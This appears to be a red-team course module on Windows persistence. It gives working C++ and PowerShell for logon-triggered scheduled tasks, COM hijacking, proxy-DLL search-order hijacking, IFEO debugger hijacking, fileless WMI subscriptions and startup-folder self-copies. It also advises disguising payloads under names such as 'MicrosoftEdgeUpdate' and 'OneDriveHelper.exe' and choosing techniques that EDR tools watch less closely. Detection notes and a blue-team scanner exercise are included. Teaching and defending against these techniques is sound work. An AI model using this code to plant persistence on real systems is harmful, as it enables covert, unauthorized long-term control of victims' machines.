# Module 10 — Advanced Persistence Techniques

A Run key is the first thing defenders check. A mature red team uses multiple
persistence mechanisms and understands the detection surface of each.

---

## 1. Persistence Taxonomy

```
User-level (no admin):              Admin-level:
  HKCU Run / RunOnce                  HKLM Run / RunOnce
  Startup folder (user)               Startup folder (all users)
  Scheduled task (current user)       Scheduled task (SYSTEM)
  COM object hijacking                Windows Service
  DLL search order hijacking          Boot/logon autostart via Winlogon
  Browser extension                   IFEO (Image File Execution Options)
  Python/pip startup hooks            Bootkit (MBR/VBR)
```

Detection difficulty increases going down. Run keys are trivially detected
by Autoruns, Process Monitor, and any EDR. Services and IFEO require more
targeted detection.

---

## 2. Scheduled Tasks

```cpp
// schtasks.exe is the simplest approach — runs cmd.exe, which itself is logged
std::string RunCommand("schtasks /create /sc ONLOGON /tn \"MicrosoftEdgeUpdate\" "
                        "/tr \"C:\\Users\\user\\AppData\\Local\\update.exe\" /f");

// Programmatic approach via COM (Task Scheduler API) — harder to detect:
#include <taskschd.h>
#include <comdef.h>

void CreateScheduledTask(const char* taskName, const char* exePath) {
    CoInitializeEx(nullptr, COINIT_MULTITHREADED);

    ITaskService* svc = nullptr;
    CoCreateInstance(CLSID_TaskScheduler, nullptr, CLSCTX_INPROC_SERVER,
                     IID_ITaskService, (void**)&svc);
    svc->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());

    ITaskFolder* root = nullptr;
    svc->GetFolder(_bstr_t("\\"), &root);

    ITaskDefinition* task = nullptr;
    svc->NewTask(0, &task);

    // Set trigger: LOGON
    ITriggerCollection* triggers = nullptr;
    task->get_Triggers(&triggers);
    ITrigger* trigger = nullptr;
    triggers->Create(TASK_TRIGGER_LOGON, &trigger);

    // Set action: run exePath
    IActionCollection* actions = nullptr;
    task->get_Actions(&actions);
    IAction* action = nullptr;
    actions->Create(TASK_ACTION_EXEC, &action);
    IExecAction* execAction = nullptr;
    action->QueryInterface(IID_IExecAction, (void**)&execAction);
    execAction->put_Path(_bstr_t(exePath));

    // Register
    IRegisteredTask* regTask = nullptr;
    root->RegisterTaskDefinition(_bstr_t(taskName), task,
        TASK_CREATE_OR_UPDATE, _variant_t(), _variant_t(),
        TASK_LOGON_INTERACTIVE_TOKEN, _variant_t(""), &regTask);

    // Cleanup (omitted for brevity — always release COM objects)
    CoUninitialize();
}
```

**Detection:** `schtasks /query /fo LIST /v` — shows all tasks.
Sysmon Event ID 1 (process create) when schtasks.exe is called.
Task XML files stored in `C:\Windows\System32\Tasks\` — readable by anyone.

---

## 3. COM Hijacking (User-level, No Admin)

Windows resolves COM class IDs (CLSIDs) by looking up the registry.
If a CLSID exists in `HKLM` but NOT in `HKCU`, you can register your own
DLL under `HKCU` and it will load instead — without admin rights.

```
1. Find a CLSID used by a frequently-run program (e.g. Explorer, Task Manager)
   that is in HKLM but not HKCU.
2. Register your DLL under:
   HKCU\Software\Classes\CLSID\{target-guid}\InprocServer32 = C:\path\to\evil.dll
3. When the program loads that CLSID, it finds your entry first → loads your DLL.
```

Tools: `Procmon` with "RegQueryValue RESULT IS NAME NOT FOUND" filter → shows
every CLSID lookup that falls through to HKLM (candidates for hijacking).

**Why hard to detect:** a normal registry write to HKCU looks innocent.
EDRs must correlate: HKCU COM registration + DLL in non-standard path → alert.

---

## 4. DLL Search Order Hijacking

Windows searches for DLLs in this order:
1. The directory the EXE is in
2. System32 (`C:\Windows\System32\`)
3. Windows directory
4. Current working directory
5. Directories in `%PATH%`

If a legitimate program tries to load `version.dll` and it's NOT in System32,
you can plant your DLL in the program's directory.

```
Target: C:\Program Files\SomeApp\app.exe
app.exe calls LoadLibrary("version.dll") — not in its directory
→ searches System32: found

But if app.exe is in C:\Users\user\AppData:
→ searches C:\Users\user\AppData first
→ YOUR version.dll there is loaded instead
```

Identify candidates: Procmon filter: `Operation is LoadImage` + `Result is NAME NOT FOUND`.

**Proxy DLL:** your malicious DLL must also export the same functions as the
real DLL, or the program crashes. You forward all calls to the real DLL:

```cpp
// version_proxy.cpp
#pragma comment(linker, "/export:GetFileVersionInfoA=C:\\Windows\\System32\\version.GetFileVersionInfoA,@1")
// ... etc for every exported function
```

---

## 5. IFEO — Image File Execution Options

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<exe name>\Debugger`

When Windows launches `<exe name>`, it actually launches whatever is in `Debugger`
with the original command as an argument.

**Offensive use:** register `cmd.exe` or your own binary as the "debugger" for
`notepad.exe`. When a victim opens Notepad, your binary runs instead.

**Requires admin.** But once set, fires on every user.

```cpp
RegSetValueExA(hKey, "Debugger", 0, REG_SZ,
               (BYTE*)"C:\\Windows\\System32\\cmd.exe /C calc.exe &", len);
```

**Detection:** Sysmon Event ID 13 (RegistryValueSet) on IFEO key.
Autoruns shows all IFEO debuggers.

---

## 6. WMI Event Subscription (Fileless Persistence)

WMI (Windows Management Instrumentation) can run a script or command when
a system event occurs (like logon, or every 60 seconds).

```powershell
# PowerShell to create WMI persistence (shows the concept):
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter `
    -Arguments @{Name="MyFilter"; EventNameSpace="root\cimv2"; `
                 QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent `
                 WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}

$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer `
    -Arguments @{Name="MyConsumer"; CommandLineTemplate="C:\path\to\evil.exe"}

Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding `
    -Arguments @{Filter=$filter; Consumer=$consumer}
```

**Why hard to detect:** no files written to disk, no registry keys under Run.
The WMI database is a binary file — not directly inspectable without tools.

**Detection:** Sysmon Event ID 19/20/21 (WmiEventFilter, WmiEventConsumer, WmiBindingFilter).
`Get-WmiObject -Namespace root\subscription -Class __EventFilter`

---

## 7. Startup Folder — The Quiet Choice

```cpp
char startupPath[MAX_PATH];
// Per-user startup (no admin needed):
SHGetFolderPathA(nullptr, CSIDL_STARTUP, nullptr, 0, startupPath);
// → C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\

// Create a .lnk shortcut or just copy the EXE there
char dest[MAX_PATH];
snprintf(dest, MAX_PATH, "%s\\OneDriveHelper.exe", startupPath);
CopyFileA(selfPath, dest, FALSE);
```

**Advantage over Run key:** some EDRs monitor Run key writes more aggressively
than startup folder copies. Explorer shows it as a folder, so less alarming.

---

## Exercises

- `ex01_scheduled_task.cpp` — create/query/delete a scheduled task via schtasks
- `ex02_startup_folder.cpp` — install/remove from startup folder
- `ex03_com_enum.cpp` — enumerate HKLM CLSIDs not present in HKCU (hijack candidates)
- `ex04_detection.cpp` — scan all persistence locations and report what's there (blue team tool)
